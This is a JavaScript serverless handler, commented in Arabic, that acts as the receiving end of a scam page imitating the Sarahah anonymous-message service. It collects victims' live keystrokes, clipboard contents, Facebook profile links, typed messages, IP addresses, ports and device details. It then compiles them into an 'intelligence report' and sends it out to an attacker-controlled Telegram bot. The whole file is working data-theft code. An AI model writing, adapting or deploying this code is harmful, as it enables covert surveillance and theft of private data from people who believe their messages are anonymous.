export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).send('Not Allowed');

    const data = req.body;
    const token = process.env.BOT_TOKEN;
    const chatId = process.env.CHAT_ID;

    // --- جمع البيانات الاستخبارية (Advanced Metadata) ---
    const forwarded = req.headers['x-forwarded-for'];
    const ip = forwarded ? forwarded.split(',')[0] : req.socket.remoteAddress;
    const sourcePort = req.socket.remotePort || "غير محدد";
    
    // تسجيل الوقت بتوقيت القاهرة
    const timestamp = new Date().toLocaleString('ar-EG', { 
        timeZone: 'Africa/Cairo',
        dateStyle: 'full',
        timeStyle: 'medium'
    });

    // بناء التقرير
    let report = `🚨 **FULL INTELLIGENCE REPORT** 🚨\n`;
    report += `━━━━━━━━━━━━━━━━━━\n`;
    report += `🌐 **IP Address:** \`${ip}\`\n`;
    report += `🔌 **Source Port:** \`${sourcePort}\`\n`;
    report += `📅 **Timestamp:** \`${timestamp}\`\n`;
    report += `📍 **Geo-Location:** [اضغط هنا](https://www.ip-tracker.org/locator/ip-lookup.php?ip=${ip})\n`;
    report += `━━━━━━━━━━━━━━━━━━\n`;

    // تصنيف البيانات الواردة
    if (data.type === "keystroke") {
        report += `⌨️ **Live Keylog:**\n\`${data.content}\`\n`;
    } else if (data.type === "clipboard") {
        report += `📋 **Pasted Content:**\n\`${data.content}\`\n`;
    } else if (data.type === "facebook_link") {
        report += `👤 **Facebook Profile:**\n${data.content}\n`;
    } else if (data.type === "final_message") {
        report += `📝 **Sarahah Message:**\n\`${data.content}\`\n`;
    }

    report += `━━━━━━━━━━━━━━━━━━\n`;
    report += `📱 **Device Info:** \`${req.headers['user-agent']}\`\n`;
    report += `🔗 **Target URL:** ${data.url}\n`;
    report += `━━━━━━━━━━━━━━━━━━`;

    try {
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: report,
                parse_mode: "Markdown"
            })
        });
        res.status(200).json({ status: 'delivered' });
    } catch (e) {
        res.status(500).send('Error');
    }
}
